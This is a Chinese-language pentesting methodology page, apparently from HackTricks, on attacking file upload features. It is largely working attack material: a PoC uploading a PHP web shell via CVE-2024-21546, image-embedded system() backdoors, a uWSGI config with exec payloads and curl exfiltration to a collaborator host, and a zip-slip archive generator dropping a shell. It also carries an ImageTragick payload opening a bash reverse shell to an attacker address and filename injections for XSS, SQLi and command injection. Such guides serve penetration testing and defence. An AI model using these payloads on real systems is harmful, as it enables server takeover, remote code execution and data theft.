# 文件上传

{{#include ../../banners/hacktricks-training.md}}

## 文件上传通用方法论

其他有用的扩展名：

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### 绕过文件扩展名检查

1. 如果适用，检查之前列出的扩展名。也用一些大写字母测试它们： _pHp, .pHP5, .PhAr ..._
2. 检查在可执行扩展名前添加一个有效扩展（也可使用前面列出的扩展）：
- _file.png.php_
- _file.png.Php5_
3. 尝试在末尾添加特殊字符。你可以使用 Burp 对所有 ASCII 和 Unicode 字符进行暴力测试。（注意你也可以尝试使用之前提到的扩展）
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. 试着通过欺骗服务器端的扩展名解析器来绕过保护，使用如重复扩展或在扩展之间添加垃圾数据（null 字节）等技术。你也可以使用之前的扩展来准备更好的 payload。
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 在之前的检查上再添加一层扩展：
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. 尝试把可执行扩展放在有效扩展之前并祈祷服务器配置错误。（在某些 Apache 错误配置中，任何带有扩展名**.php** 的文件，即使不以 .php 结尾，也可能执行代码）
- _ex: file.php.png_
7. 在 Windows 上使用 NTFS alternate data stream (ADS)。在这种情况下，会在被禁止的扩展之后、允许的扩展之前插入一个冒号字符 ":"。因此，服务器上会创建一个带有被禁止扩展的空文件（例如 "file.asax:.jpg"）。这个文件后来可能通过其他技术（例如使用其短文件名）进行编辑。“**::$data**”模式也可用于创建非空文件，因此在此模式后添加一个点字符有时也能绕过进一步的限制（例如 "file.asp::$data."）。
8. 尝试突破文件名长度限制。有效扩展被截断，而恶意的 PHP 得以保留。 AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

有些上传处理器会修剪或规范化保存文件名中的尾随点字符。在 UniSharp 的 Laravel Filemanager (unisharp/laravel-filemanager) 2.9.1 之前的版本中，你可以通过以下方式绕过扩展名校验：

- 使用有效的 image MIME 和 magic header（例如 PNG 的 `\x89PNG\r\n\x1a\n`）。
- 将上传的文件命名为以 PHP 扩展名结尾并带有一个点，例如 `shell.php.`。
- 服务器会去掉尾随点并持久化为 `shell.php`，如果该文件被放在可被 web 访问的目录（默认 public storage，如 `/storage/files/`）下就会执行。

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
然后访问已保存的路径（通常出现在 Laravel + LFM 中）：
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- 升级 unisharp/laravel-filemanager 到 ≥ 2.9.1。
- 在服务器端强制执行严格的 allowlists 并重新验证持久化的文件名。
- 从不可执行的位置提供上传文件。

### Bypass Content-Type, Magic Number, Compression & Resizing

- 通过将 **Content-Type** **header** 的 **value** 设置为：_image/png_、_text/plain_、application/octet-stream 来绕过 **Content-Type** 检查。
1. Content-Type 字典： [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- 通过在文件开头添加真实图片的字节来绕过 **magic number** 检查（混淆 _file_ 命令）。或者把后门放入**元数据**：\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` 或者你也可以直接把 payload 插入到图片中：\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- 如果对你的图片正在添加**压缩**，例如使用像 [PHP-GD](https://www.php.net/manual/fr/book.image.php) 这样的常用 PHP 库，之前的技术可能就不再有效。不过，你可以使用 **PLTE chunk** 的 [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 来插入一些能**在压缩后存活**的文本。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- 网页也可能会**缩放**图片，例如使用 PHP-GD 的 `imagecopyresized` 或 `imagecopyresampled`。不过，你可以使用 **IDAT chunk** 的 [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 来插入一些能**在压缩后存活**的文本。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- 另一种使 payload **在图像缩放后存活** 的技术，针对使用 PHP-GD 的 `thumbnailImage`。不过，你可以使用 **tEXt chunk** 的 [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 来插入一些能**在压缩后存活**的文本。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- 找到可以**重命名**已上传文件的漏洞（以更改扩展名）。
- 找到 **Local File Inclusion** 漏洞以执行后门。
- **可能的信息泄露**：
1. 多次（并在**同一时间**）上传**相同名称**的**同一文件**
2. 上传一个名称与已存在的**文件**或**文件夹**相同的文件
3. 上传一个名为 `"."`, `".."`, 或 `"…”` 的文件。例如，在 **Windows** 上的 Apache 中，如果应用将上传文件保存在 "/www/uploads/" 目录，文件名为 "." 会在 "/www/" 目录下创建一个名为 "uploads" 的文件。
4. 上传一个可能不易删除的文件，例如在 **NTFS** 下的 `"…:.jpg"`。（Windows）
5. 在 **Windows** 上上传包含无效字符（例如 `|<>*?”`）的文件名。（Windows）
6. 在 **Windows** 上上传使用保留（禁用）名称的文件，例如 CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, 和 LPT9。
- 还可以尝试上传可执行文件（.exe）或一个较不显眼的 .html，当受害者意外打开时会执行代码。

### Special extension tricks

如果你试图向 **PHP server** 上传文件，请查看用于执行代码的 **.htaccess** 技巧： [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution)。\
如果你试图向 **ASP server** 上传文件，请查看用于执行代码的 **.config** 技巧：../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files

`.phar` 文件类似于 Java 的 `.jar`，但用于 php，可以像 php 文件那样使用（用 php 执行，或在脚本中包含...）

`.inc` 扩展有时用于仅用于**导入文件**的 php 文件，因此在某些情况下，可能有人允许**此扩展被执行**。

## **Jetty RCE**

如果你能向 Jetty 服务器上传 XML 文件，你可以获得 [RCE，因为 **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**。** 如下图所示，将 XML 文件上传到 `$JETTY_BASE/webapps/` 并期待 shell！

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

关于此漏洞的详细探讨请查看原始研究： [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)。

如果可以修改 `.ini` 配置文件，uWSGI 服务器上可能存在 Remote Command Execution (RCE) 漏洞。uWSGI 配置文件使用特定的语法来包含“magic”变量、占位符和运算符。值得注意的是 '@' 运算符，以 `@(filename)` 的形式使用，用于包含文件内容。在 uWSGI 支持的各种 scheme 中，"exec" scheme 特别强大，它允许从进程的标准输出读取数据。当处理 `.ini` 配置文件时，此功能可以被用于恶意目的，例如 Remote Command Execution 或 Arbitrary File Write/Read。

考虑下面这个有害的 `uwsgi.ini` 示例，展示了各种 scheme：
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

It's crucial to understand the lax nature of uWSGI's configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or PDF), further broadening the scope of potential exploitation.

## **wget 文件上传/SSRF 技巧**

在某些情况下，你可能会发现服务器使用 **`wget`** 来 **下载文件**，并且可以 **指定** **URL**。在这些情况下，代码可能会检查所下载文件的扩展名是否在白名单内，以确保只会下载被允许的文件。然而，**这个检查是可以绕过的。**\

在 **linux** 中，**文件名** 的 **最大** 长度为 **255**，然而，**wget** 会将文件名 **截断** 为 **236** 个字符。你可以 **下载名为 "A"\*232+".php"+".gif" 的文件**，这个文件名将会 **绕过** **检查**（例如在此情形中 **".gif"** 是一个 **有效** 的扩展名），但 `wget` 会 **重命名** 该文件为 **"A"\*232+".php"**。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
注意你可能会想到的另一种绕过此检查的方式是让 **HTTP server** 重定向到不同的文件，这样初始 URL 将绕过检查，然后 wget 会下载重定向后的新文件名。除非使用参数 `--trust-server-names` 否则这 **不会生效**，因为 **wget 会使用原始 URL 中指示的文件名来下载被重定向的页面**。

## 工具

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) 是一个强大的工具，旨在帮助 Pentesters 和 Bug Hunters 测试文件上传机制。它结合了多种 bug bounty 技术，简化识别和利用漏洞的过程，确保对 web 应用进行彻底评估。

### 利用 snprintf 异常破坏上传索引（历史）

一些使用 `snprintf()` 或类似函数将单文件上传构建为多文件数组的遗留上传处理器，可能被欺骗以伪造 `_FILES` 结构。由于 `snprintf()` 行为的不一致性和截断，精心构造的单次上传可能在服务器端表现为多个带索引的文件，混淆假定严格形状的逻辑（例如，将其视为多文件上传并进入不安全的分支）。虽然如今较为小众，但这种“索引破坏”模式偶尔会在 CTF 和旧代码库中重现。

## 从文件上传到其他漏洞

- 将 **filename** 设置为 `../../../tmp/lol.png` 并尝试实现 **path traversal**
- 将 **filename** 设置为 `sleep(10)-- -.jpg`，可能触发 **SQL injection**
- 将 **filename** 设置为 `<svg onload=alert(document.domain)>` 以实现 **XSS**
- 将 **filename** 设置为 `; sleep 10;` 来测试一些命令注入（更多 [command injections tricks here](../command-injection.md)）
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- 尝试来自 [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) 的不同 svg payloads
- [著名的 **ImageTrick** 漏洞](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- 如果你能指示 web server 从某个 URL 抓取图片，可以尝试滥用 [SSRF](../ssrf-server-side-request-forgery/index.html)。如果该 **image** 将被 **保存** 到某个 **public** 站点，你也可以指定来自 [https://iplogger.org/invisible/](https://iplogger.org/invisible/) 的 URL，从而 **窃取每位访问者的信息**。
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- 特制的 PDF 导致 XSS：下面的页面展示了如何 **注入 PDF 数据以获得 JS 执行** (../xss-cross-site-scripting/pdf-injection.md)。如果你可以上传 PDF，可以按照给定说明准备某些 PDF 来执行任意 JS。
- 上传 \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) 的内容以检查服务器是否有任何 **防病毒软件**
- 检查上传文件时是否存在任何 **size limit**

下面是通过上传可以实现的前十项（来自 [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)）：

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

参见 [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) 以获取其他文件类型的签名。

## Zip/Tar File Automatically decompressed Upload

如果你可以上传一个会在服务器内部被解压的 ZIP，你可以做两件事：

### 符号链接 (Symlink)

上传一个包含指向其他文件的软链接的压缩包，然后访问解压后的文件时，你将访问被链接的文件：
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 在不同文件夹解压

在解压缩过程中意外在目录中创建文件是一个严重问题。尽管最初可能认为这种设置可以防止通过恶意文件上传进行的 OS-level 命令执行，但 ZIP archive format 对层级压缩的支持和 directory traversal 能力可能会被利用。攻击者可以通过操纵目标应用的解压功能绕过限制并从受保护的 upload directories 逃逸。

用于生成此类文件的自动化 exploit 可在 [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) 获取。该工具的用法如下：
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
此外，**symlink trick with evilarc** 是一个选项。如果目标是针对类似 `/flag.txt` 的文件，应在你的系统中创建指向该文件的符号链接。这样可以确保 evilarc 在运行过程中不会遇到错误。

下面是用于创建恶意 zip 文件的 Python 代码示例：
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**滥用压缩进行文件喷射**

有关更多细节 **查看原始帖子**： [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**：编写 PHP 代码以执行通过 `$_REQUEST` 变量传递的命令。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**：创建多个文件，并将这些文件打包到一个 zip 归档中。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**：使用 vi 或十六进制编辑器修改 zip 内部文件名，将 "xxA" 更改为 "../" 以进行目录遍历。

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

将此内容以图像扩展名上传以利用该漏洞 **(ImageMagick , 7.0.1-1)**（参见 [exploit](https://www.exploit-db.com/exploits/39767)）
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## 在 PNG 中嵌入 PHP Shell

在 PNG 文件的 IDAT chunk 中嵌入 PHP shell 可以有效绕过某些图像处理操作。来自 PHP-GD 的函数 `imagecopyresized` 和 `imagecopyresampled` 在此情境尤其相关，因为它们通常分别用于调整图像大小和重采样。嵌入的 PHP shell 在这些操作中保持不受影响的能力，对某些用例而言是重要优势。

关于该技术的详细探讨，包括方法论和潜在应用，请参见以下文章：["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。该资源提供了对该过程及其影响的全面理解。

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files 在网络安全中是独特的工具，像变色龙一样可以同时以多种文件格式合法存在。一个有趣的例子是 [GIFAR](https://en.wikipedia.org/wiki/Gifar)，它既是 GIF 也是 RAR 存档。这样的文件不局限于这种组合；像 GIF 和 JS 或 PPT 和 JS 这样的组合也可行。

Polyglot files 的核心用途在于其能够规避基于文件类型的安全检测。许多应用的常见做法是只允许某些文件类型上传——例如 JPEG、GIF 或 DOC——以降低来自潜在有害格式（例如 JS、PHP 或 Phar 文件）的风险。然而，polyglot 通过同时符合多种文件类型的结构要求，能够悄然绕过这些限制。

尽管具有适应性，polyglots 仍然存在局限。例如，尽管 polyglot 可能同时表现为 PHAR 文件 (PHp ARchive) 和 JPEG，它是否能成功上传可能取决于平台的文件扩展名策略。如果系统严格限制允许的扩展名，polyglot 的结构双重性可能不足以保证其上传成功。

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### 像上传 PDF 一样上传有效的 JSON

如何通过伪造 PDF 文件来上传有效的 JSON（即使不被允许）以规避文件类型检测（技术来自 **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**）：

- **`mmmagic` library**: 只要 `%PDF` 魔数在前 1024 字节内就被视为有效（参见文章示例）
- **`pdflib` library**: 在 JSON 的某个字段中加入伪造的 PDF 格式，使库认为它是 PDF（参见文章示例）
- **`file` binary**: 它最多会读取 1048576 字节。只需创建一个比这更大的 JSON，使其无法将内容解析为 JSON，然后在 JSON 内部放入真实 PDF 的起始部分，它就会判断为 PDF

## 参考资料

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
